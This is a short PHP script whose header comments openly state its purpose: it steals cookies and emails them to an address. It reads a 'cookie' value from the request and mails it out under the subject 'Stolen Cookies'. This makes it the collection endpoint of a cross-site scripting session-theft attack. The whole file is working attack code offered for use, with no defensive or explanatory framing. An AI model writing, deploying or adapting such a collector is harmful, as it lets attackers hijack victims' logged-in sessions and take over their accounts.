//Author: Nahid Sarker
//Date created: 9/19/2017
//Date modified: 9/19/2017
//Purpose: Steals cookies and sends it to an email
//Created on Ubuntu 16.04.3 LTS
//Tested on Ubuntu 16.04.3 LTS

<?php
    $cookie = $HTTP_GET_VARS["cookie"];
    mail("[email]", "Stolen Cookies", $cookie);
?>
